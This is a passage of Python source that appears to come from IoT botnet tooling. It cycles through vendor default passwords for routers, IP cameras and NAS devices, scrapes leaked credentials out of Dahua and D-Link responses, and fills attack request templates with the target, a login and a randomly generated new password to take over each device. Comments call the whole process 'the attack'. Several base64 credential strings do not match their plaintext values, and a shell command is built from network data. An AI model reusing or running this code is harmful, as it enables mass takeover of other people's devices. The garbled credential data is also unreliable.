                    HTTPtargets_passhint[jobhash] = 'adm'
                    b64userpass[jobhash] = 'YWRtaW46YWRtaW4='
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '1234'
                    b64userpass[jobhash] = 'YWRtaW46MTIzNDU2'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 4:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '0000'
                    b64userpass[jobhash] = 'YWRtaW46MDAwMDAw'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 5:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '123456'
                    b64userpass[jobhash] = 'YWRtaW46MTIzNDU2Nzg='
                    HTTP_tries[jobhash] = 5
            else:
                if HTTP_tries[jobhash] >= 5:
                    HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'grandstream':
        if HTTP_tries[jobhash] <= 4:

            if '200 OK' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    b64userpass[jobhash] = 'YWRtaW46YWRta='
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '123'
                    b64userpass[jobhash] = 'YWRtaW46MTIzN='
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '12'
                    b64userpass[jobhash] = 'YWRtaW46MTIz=='
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '123'
                    b64userpass[jobhash] = 'YWRtaW46MTIzND'
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 4:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '8888'
                    b64userpass[jobhash] = 'YWRtaW46ODg4OD'
                    HTTP_tries[jobhash] = 4
            else:
                if HTTP_tries[jobhash] >= 4:
                    HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'dir300600':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'dir850':
        if HTTP_tries[jobhash] == 0:
            if '<gw_name>' in http_response[s_hash]:
                username = re.search('name>([^<]+)</name', http_response[s_hash])
                password = re.search('password>(.*)</password>',
                                  http_response[s_hash])
                if username and password:
                    HTTPtargets_loginhint[jobhash] = username.group(1)
                    HTTPtargets_passhint[jobhash] = password.group(1)
        if HTTP_tries[jobhash] == 1:

            if 'status": "ok"' in http_response[s_hash]:
                HTTPtargets_loginhint[jobhash] += 'OK'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'hikweb':
        if HTTP_tries[jobhash] <= 10:

            if 'Reboot Required' in http_response[s_hash]:
                HTTPtargets_loginhint[jobhash] = 'n'
                HTTPtargets_passhint[jobhash] = 'a'

            elif 'Value>200</status' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '123'
                    b64userpass[jobhash] = 'YWRtaW46MTIzN='
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    b64userpass[jobhash] = 'YWRtaW46YWRta='
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '12'
                    b64userpass[jobhash] = 'YWRtaW46MTIz=='
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '8888'
                    b64userpass[jobhash] = 'YWRtaW46ODg4OD'
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 4:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '543'
                    b64userpass[jobhash] = 'YWRtaW46NTQzM='
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 5:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '1234'
                    b64userpass[jobhash] = 'YWRtaW46MTIzND'
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 6:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '1111'
                    b64userpass[jobhash] = 'YWRtaW46MTExMT'
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 7:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '6543'
                    b64userpass[jobhash] = 'YWRtaW46NjU0Mz'
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 8:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '123456789a'
                    b64userpass[jobhash] = 'YWRtaW46MTIzNDU2Nzg5YW'
                    HTTP_tries[jobhash] = 10
                elif HTTP_tries[jobhash] == 9:
                    pass
                elif HTTP_tries[jobhash] == 10:
                    pass
            else:
                if HTTP_tries[jobhash] >= 10:
                    HTTP_tries[jobhash] = 99
        if HTTPtargets_loginhint[jobhash] == 'n':
            HTTP_waittime[jobhash] = time.time() + 60
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'sify':
        if HTTP_tries[jobhash] <= 0:
            location = re.search('Location: /cgi-bin/luci/;stok=([a-f0-9]+)',
                               http_response[s_hash])
            setcookie = re.search('Set-Cookie: sysauth=([a-f0-9]+);',
                              http_response[s_hash])
            if location and setcookie:
                b64userpass[jobhash] = location.group(1)
                sessid[jobhash] = setcookie.group(1)
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'admin'
                    HTTP_tries[jobhash] = 0
            else:
                if HTTP_tries[jobhash] >= 0:
                    HTTP_tries[jobhash] = 99
        else:
            pass
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'zyxelp660':
        if HTTP_tries[jobhash] <= 1:

            if not '/rpAuth' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '12'
                    HTTP_tries[jobhash] = 1
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    HTTP_tries[jobhash] = 1
            else:
                if HTTP_tries[jobhash] >= 1:
                    HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'supernet':

        if HTTP_tries[jobhash] <= 0:
            if '200 OK' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    HTTP_tries[jobhash] = 0
            else:
                if HTTP_tries[jobhash] >= 0:
                    HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'realtron':

        if HTTP_tries[jobhash] <= 3:
            if ('200 OK' in http_response[s_hash] and
                    not 'Failed' in http_response[s_hash] and
                    not 'enter a username and password when prompted'
                        in http_response[s_hash]):
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    b64userpass[jobhash] = 'YWRtaW46YWRta='
                    HTTP_tries[jobhash] = 3
                if HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    b64userpass[jobhash] = 'YWRtaW46YWRta='
                    HTTP_tries[jobhash] = 3
                if HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '1234'
                    b64userpass[jobhash] = 'YWRtaW46MTIz=='
                    HTTP_tries[jobhash] = 3
                if HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'password'
                    b64userpass[jobhash] = 'YWRtaW46cGFzc3dvc='
                    HTTP_tries[jobhash] = 3
            else:
                if HTTP_tries[jobhash] >= 3:
                    HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'pldtmydsl':
        if HTTP_tries[jobhash] <= 0:

            regresult = re.search('SESSION=(\d+)', http_response[s_hash])
            if regresult:
                b64userpass[jobhash] = regresult . group(1)
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '12'
                    HTTP_tries[jobhash] = 0
            else:
                if HTTP_tries[jobhash] >= 0:
                    HTTP_tries[jobhash] = 99
        else:

            regresult = re.search('SESSION=(\d+)', http_response[s_hash])
            if regresult:
                b64userpass[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'pldtfibr':
        if HTTP_tries[jobhash] <= 2:

            if '/menu_pldt.asp' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'adminpldt'
                    HTTPtargets_passhint[jobhash] = '01234567'
                    HTTP_tries[jobhash] = 2
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'adminpl'
                    HTTPtargets_passhint[jobhash] = '12345678'
                    HTTP_tries[jobhash] = 2
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = '1234'
                    HTTP_tries[jobhash] = 2
            else:
                if HTTP_tries[jobhash] >= 2:
                    HTTP_tries[jobhash] = 99
        if HTTP_tries[jobhash] == 3:
            randpass[jobhash] = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678901234567890123456789') for i in range(8))
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'foscamold':
        if HTTP_tries[jobhash] == 0:

            if 'HTTP/1.1 200 O' in http_response[s_hash]:
                HTTPtargets_loginhint[jobhash] = 'admin'
                HTTPtargets_passhint[jobhash] = ''
            else:
                HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'telkomdlink':
        if HTTP_tries[jobhash] == 0:

            if 'HTTP/1.1 200 O' in http_response[s_hash]:
                HTTPtargets_loginhint[jobhash] = 'support'
                HTTPtargets_passhint[jobhash] = 'TelkomDlink123'
            else:
                HTTP_tries[jobhash] = 99
        else:
            if 'sessionKey' in http_response[s_hash]:
                regresult = re.search('sessionKey=\'?(\d+)', http_response[s_hash])
                if regresult:
                    b64userpass[jobhash] = regresult.group(1)

        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'aztechweb':
        if HTTP_tries[jobhash] <= 4:

            regresult = re.search('SESSIONID=(\d+)', http_response[s_hash])
            if regresult:
                b64userpass[jobhash] = regresult.group(1)
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'bayand'
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'epicrout'
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'passwo'
                    HTTP_tries[jobhash] = 4
                elif HTTP_tries[jobhash] == 4:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = ''
                    HTTP_tries[jobhash] = 4
            else:
                if HTTP_tries[jobhash] >= 4:
                    HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'netgeardgn1022':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'netgearr7064':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'vacron':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'jaws':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'readynas':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'airosfile':
        HTTPtargets_loginhint[jobhash] = 'n'
        HTTPtargets_passhint[jobhash] = 'a'
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'xionghash':
        resp_concat = re.sub("[\r\n]", '', http_response[s_hash])
        regresult = re.search('Name"\s+:\s+"admin",.*?"Password"\s+:\s+"([A-Za-z0-9]{8})"',
                              resp_concat)
        if regresult:
            HTTPtargets_loginhint[jobhash] = 'admin'
            HTTPtargets_passhint[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'mediatekajax':
        if HTTP_tries[jobhash] <= 5:
            if '?sid=' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'admin1'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'admin12'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'passwo'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 4:
                    HTTPtargets_loginhint[jobhash] = 'user'
                    HTTPtargets_passhint[jobhash] = 'us'
                    HTTP_tries[jobhash] = 5
                elif HTTP_tries[jobhash] == 5:
                    HTTPtargets_loginhint[jobhash] = 'guest'
                    HTTPtargets_passhint[jobhash] = 'gue'
                    HTTP_tries[jobhash] = 5
            else:
                if HTTP_tries[jobhash] >= 5:
                    HTTP_tries[jobhash] = 99

        regresult = re.search('\?sid=([a-zA-Z0-9]+)', http_response[s_hash])
        if regresult:
            b64userpass[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'mediatekwimax':

        if HTTP_tries[jobhash] <= 3:

            if '?WWW_SID=SID' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    HTTP_tries[jobhash] = 3
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'user'
                    HTTPtargets_passhint[jobhash] = 'us'
                    HTTP_tries[jobhash] = 3
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'guest'
                    HTTPtargets_passhint[jobhash] = 'gue'
                    HTTP_tries[jobhash] = 3
                elif HTTP_tries[jobhash] == 3:
                    HTTPtargets_loginhint[jobhash] = 'guest'
                    HTTPtargets_passhint[jobhash] = 'linkem1'
                    HTTP_tries[jobhash] = 3
            else:
                if HTTP_tries[jobhash] >= 3:
                    HTTP_tries[jobhash] = 99

        regresult = re.search('\?WWW_SID=(SID\d+)', http_response[s_hash])
        if regresult:
            b64userpass[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'mediatekrpc':

        if HTTP_tries[jobhash] <= 2:
            if '?WWW_SID=' in http_response[s_hash]:
                if HTTP_tries[jobhash] == 0:
                    HTTPtargets_loginhint[jobhash] = 'admin'
                    HTTPtargets_passhint[jobhash] = 'adm'
                    HTTP_tries[jobhash] = 2
                elif HTTP_tries[jobhash] == 1:
                    HTTPtargets_loginhint[jobhash] = 'user'
                    HTTPtargets_passhint[jobhash] = 'us'
                    HTTP_tries[jobhash] = 2
                elif HTTP_tries[jobhash] == 2:
                    HTTPtargets_loginhint[jobhash] = 'guest'
                    HTTPtargets_passhint[jobhash] = 'gue'
                    HTTP_tries[jobhash] = 2
            else:
                if HTTP_tries[jobhash] >= 2:
                    HTTP_tries[jobhash] = 99

        regresult = re.search('\?WWW_SID=([A-Z0-9]+)', http_response[s_hash])
        if regresult:
            b64userpass[jobhash] = regresult.group(1)
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'mdmweb':

        if HTTP_tries[jobhash] == 0:

            regresult = re.search('"result":"0".*"token":"([^"]+)"',
                                  http_response[s_hash])
            if regresult:
                b64userpass[jobhash] = regresult.group(1)
                HTTPtargets_loginhint[jobhash] = 'admin'
                HTTPtargets_passhint[jobhash] = 'adm'

                HTTP_tries[jobhash] = 1

        elif HTTP_tries[jobhash] == 1:

            if regresult:
                b64userpass[jobhash] = regresult.group(1)
                HTTPtargets_loginhint[jobhash] = 'admin'
                HTTPtargets_passhint[jobhash] = 'adm'

            else:
                HTTP_tries[jobhash] = 99
        HTTP_tries[jobhash] += 1

    if cmd_OEM == 'dahua':
        if HTTP_tries[jobhash] == 0:
            responselines = http_response[s_hash].split('\n')
            credentials = []

            # Expect responselines to contain credentials from target host.
            for line in responselines:

                regresult = re.search('^\d:([^:]+):([^:]+):\d+\S+,\s+\S+,',
                                      line)
                if regresult:
                    credentials.append(regresult.group(1) + "/" +
                                       regresult.group(2))

            if len(credentials) > 0:
                idx = - 1
                for idx_cred in range(len(credentials)):
                    if 'admin/' in credentials[idx_cred]:
                        idx = idx_cred
                        break
                    if '888888/' in credentials[idx_cred]:
                        idx = idx_cred
                        break

                if idx < 0:
                    if 'default/' in credentials[0] and len(credentials) > 1:
                        idx = 1
                    else:
                        idx = 0

                b64userpass[jobhash] = credentials[idx].split('/')[0]
                ssid[jobhash] = credentials[idx].split('/')[1]
                authtype[jobhash] = 'OldDigest'
                HTTPtargets_loginhint[jobhash] = b64userpass[jobhash]
                HTTPtargets_passhint[jobhash] = ssid[jobhash]
                if len(ssid[jobhash]) == 32:
                    ssid_active = 1
                    authtype[jobhash] = 'Default'
            else:
                HTTP_tries[jobhash] = 99
            HTTP_tries[jobhash] += 1
        elif HTTP_tries[jobhash] == 1:

            regresult = re.search('"session"\s*:\s*(\d+)',
                                  http_response[s_hash])
            if regresult:
                sessid[jobhash] = regresult.group(1)

                if len(ssid[jobhash]) == 32:
                    regresult = re.search('"random"\s*:\s*"?(\d+)"?',
                                         http_response[s_hash])
                    if regresult:

                        target_cred = HTTPtargets_loginhint[jobhash] + ":" + \
                                     regresult.group(1) + ":" + \
                                     ssid[jobhash]

                        unusedstring = ''  # Unused string.

                        # Generate md5 hash
                        process_md5 = subprocess.Popen('echo -n ' +
                                                         target_cred +
                                                         '|md5sum',
                                                         shell=True,
                                                         stdout=subprocess.PIPE)
                        intext = process_md5.communicate()[0]
                        regresult = re.search('([a-f0-9]{32})', intext)
                        if regresult:
                            ssid[jobhash] = regresult.group(1).upper()

                            HTTP_tries[jobhash] += 1
                            HTTP_reqtimes[s_hash] = time.time()
                            HTTPtargets_requests[s_hash] = \
                                (HTTP_cmdrequests[jobhash]
                                 [HTTP_tries[jobhash]])
                            sendrequest(sock, s_hash, jobhash)
                            return

            else:
                HTTP_tries[jobhash] = 99
            HTTP_tries[jobhash] += 1
        else:
            if HTTP_timeout[jobhash]:
                HTTP_tries[jobhash] += 1
                if HTTP_tries[jobhash] >= len(HTTP_cmdrequests[jobhash]) - 1:
                    HTTP_timeout[jobhash] = 0
                    ssid_active = 0
                    try:
                        sock.close()
                    except:
                        pass
                else:
                    HTTP_reqtimes[s_hash] = time.time()
                    HTTPtargets_requests[s_hash] = \
                        HTTP_cmdrequests[jobhash][HTTP_tries[jobhash]]
                    sendrequest(sock, s_hash, jobhash)
                    return
            else:
                HTTP_tries[jobhash] += 1

    if HTTP_timeout[jobhash]:
        printstatus("NOTC: Untrapped keepalive")
        try:
             sock.close()
        except:
            pass

    if ssid_active:
        HTTP_timeout[jobhash] = ssid_active

    timenow = time.time()
    if HTTP_waittime[jobhash] <= timenow:
        HTTP_waittime[jobhash] = time.time() + HTTP_wait
    HTTP_connsock[jobhash] = None

    HTTPtargets_s.remove(sock)
    HTTPtargets_targets[s_hash] = None
    HTTP_reqsent[s_hash] = None
    HTTPtargets_requests[s_hash] = None
    http_response[s_hash] = None
    HTTP_reqtimes[s_hash] = None
    jobhashes[s_hash] = None


def HTTP_connecttargets():
    """
    This function uses HTTP_connect() to establish connections with target
    hosts in target_ipportban, then updates socket objects in HTTP_connsock.
    If number of tries exceeds number of available requests to send, then
    use HTTP_reset() to reset the attack.
    
    Inputs:
        None.
    
    Outputs:
        Updates to HTTP_consock[] and HTTP_waittime[].
        
    Returns:
        None.
    """


    timenow = time.time()
    hashes = HTTP_hashes
    for ahash in hashes:
        jobhash = hash(ahash)

        if HTTP_connsock[jobhash] == None:
            if HTTP_tries[jobhash] >= len(HTTP_cmdrequests[jobhash]):
                HTTP_reset(jobhash)
                continue

            if timenow >= HTTP_waittime[jobhash]:
                connectsock = HTTP_connect(target_ipportbann[jobhash][0],  # IP
                                           target_ipportbann[jobhash][1],  # port
                                           HTTP_cmdrequests[jobhash][HTTP_tries[jobhash]],
                                           jobhash)

                HTTP_connsock[jobhash] = connectsock
                HTTP_waittime[jobhash] = 0


def sendrequest(sock, webhash, jobhash):
    """
    This function sends a request from HTTPtargets_requests, inserting
    parameters such as IP, port, username, password, body length, etc.

    Inputs:
        sock: Socket of target host to which the request is sent.
        webhash: Hash(sock.sock()) as key for HTTPtargets_requests to get
                 a request to send.
        jobhash: Hash(targetip, int(targetport)) as key for target_ipportbann[]
                 to get target host information such as IP, port, username, and
                 password.

    Outputs:
        None.

    Returns:
        1. Note that other returns are not possible.
    """

    # Random numbers for IP host
    rand30to254 = random.uniform(30, 254)
    rand1to254 = random.uniform(1, 254)

    if '%' in HTTPtargets_requests[webhash]:
        if '%%TARGETIP%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%TARGETIP%%',
                target_ipportbann[jobhash][0],  # IP
                HTTPtargets_requests[webhash])
        if '%%TARGETPORT%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%TARGETPORT%%',
                '%d' % (target_ipportbann[jobhash][1]),
                HTTPtargets_requests[webhash])
        if '%%LOGIN%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%LOGIN%%',
                HTTPtargets_loginhint[jobhash],
                HTTPtargets_requests[webhash])
        if '%%PASSWORD%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%PASSWORD%%',
                HTTPtargets_passhint[jobhash],
                HTTPtargets_requests[webhash])
        if '%%NEWPASSWORD%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%NEWPASSWORD%%',
                randpass[jobhash],
                HTTPtargets_requests[webhash])
        if '%%CUSTOM1%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%CUSTOM1%%',
                b64userpass[jobhash],
                HTTPtargets_requests[webhash])
        if '%%CUSTOM2%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%CUSTOM2%%',
                sessid[jobhash],
                HTTPtargets_requests[webhash])
        if '%%CUSTOM3%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%CUSTOM3%%',
                ssid[jobhash],
                HTTPtargets_requests[webhash])
        if '%%CUSTOM4%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%CUSTOM4%%',
                authtype[jobhash],
                HTTPtargets_requests[webhash])
        if '%%RAND16%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%RAND16%%',
                '%d.%d' % (rand30to254,
                           random.uniform(20, 200)),
                HTTPtargets_requests[webhash])
        if '%%COMP16%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%COMP16%%',
                '%d.%d' % (rand30to254,
                           random.uniform(201, 253)),
                HTTPtargets_requests[webhash])
        if '%%RAND8%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%RAND8%%',
                '%d.%d.%d' % (rand30to254,
                              rand1to254,
                              random.uniform(20, 200)),
                HTTPtargets_requests[webhash])
        if '%%COMP8%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%COMP8%%',
                 '%d.%d.%d' % (rand30to254,
                               rand1to254,
                               random.uniform(201, 253)),
                 HTTPtargets_requests[webhash])
        if '%%RHEX1%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%RHEX1%%',
                ''.join(random.choice('ABCDEF0123456789')
                        for i in range(2)),
                HTTPtargets_requests[webhash])
        if '%%RHEX2%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%RHEX2%%',
                ''.join(random.choice('ABCDEF0123456789')
                        for i in range(2)),
                HTTPtargets_requests[webhash])
        if '%%RHEX3%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%RHEX3%%',
                ''.join(random.choice('ABCDEF0123456789')
                        for i in range(2)),
                HTTPtargets_requests[webhash])
        if '%%RANDPORT%%' in HTTPtargets_requests[webhash]:
            HTTPtargets_requests[webhash] = re.sub(
                '%%RANDPORT%%',
                '%d' % (random.uniform(10000, 65000)),
                HTTPtargets_requests[webhash])

        if '%%BODYLENGTH%%' in HTTPtargets_requests[webhash]:
            body_idx = HTTPtargets_requests[webhash].find('\r\n\r\n')
            contentlength = -1
            if body_idx >= 0:
                body_idx += 4
            else:
                body_idx = HTTPtargets_requests[webhash].find('\n\n')
                if body_idx >= 0:
                    body_idx += 2

            if body_idx >= 0:

                contentlength = (len(HTTPtargets_requests[webhash]) - body_idx)
                contentlength = (len(HTTPtargets_requests[webhash]) - body_idx)

            HTTPtargets_requests[webhash] = re.sub('%%BODYLENGTH%%',
                                       '%d' % (contentlength),
                                       HTTPtargets_requests[webhash])
    try:
        sock.send(HTTPtargets_requests[webhash])
    except:
        pass

    return 1


def HTTP_targets_send():
    """
    This function sends HTTP requests for all targets for all sockets that are
    available, via HTTP_sendrequests().
    
    Inputs:
        None.
        
    Outputs:
        HTTP_timeout[] may be updated.
    
    Returns:
        None.
    """
    
    global HTTP_wait_timeout
    global webclient_maxconnectiontime_payload

    timenow = time.time()

    timeout = 0.01
    socktreadyr, sockreadyw, noneready = select.select(HTTPtargets_s,
                                                       HTTPtargets_s,
                                                       [],
                                                       timeout)
    for s in HTTPtargets_s:
        s_hash = hash(s)
        s_opt = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)

        if s_opt != 0:
            if http_response[s_hash] == '':
                http_response[s_hash] = '(timeout)'
            HTTP_sendrequests(s)
            continue

        if s in socktreadyr:
            intext = ''
            try:
                intext = s.recv(2048)
            except:
                pass
            
            if intext:
                http_response[s_hash] += intext

                # Find start of body.
                body_idx = http_response[s_hash].find('\r\n\r\n')
                if body_idx >= 0:
                    body_idx += 4
                else:
                    body_idx = http_response[s_hash].find('\n\n')
                    if body_idx >= 0:
                        body_idx += 2

                if body_idx >= 0:
                    regresult = re.search('Content-Length:\s*(\d+)',
                                          http_response[s_hash])
                    if regresult:
                        contentlength = int(regresult.group(1))

                        if len(http_response[s_hash])-body_idx == contentlength:
                            HTTP_sendrequests(s)
                            continue

            else:
                HTTP_sendrequests(s)
                continue
        if s in sockreadyw:
            if HTTP_reqsent[s_hash] == 0:
                jobhash = jobhashes[s_hash]
                sendrequest(s, s_hash, jobhash)
                HTTP_reqsent[s_hash] = 1

        timetowait = HTTP_wait_timeout
        jobhash = jobhashes[s_hash]
        if HTTP_timeout[jobhash]:
            timetowait = 15

        if timenow - HTTP_reqtimes[s_hash] > timetowait:
            if http_response[s_hash] == '':
                http_response[s_hash] = '(timeout)'
            HTTP_sendrequests(s)
            continue


time.sleep(3)

timetowait_set = 20  # Set time to wait
timetowait_job = 7  # Additional time for job wait time.

# List of target hosts for SOAP, TR069, and Huawei GET request attacks.
# Items are socket objects of active connections to target hosts.
requestsocket_active = []

# Dictionary containing request target information. Keys are
# hash(socket.socket()) of target hosts. Values are (IP, port, request) of
# target.
requesttarget_target = {}

# Dictionary containing job hashes of request targets. Keys are
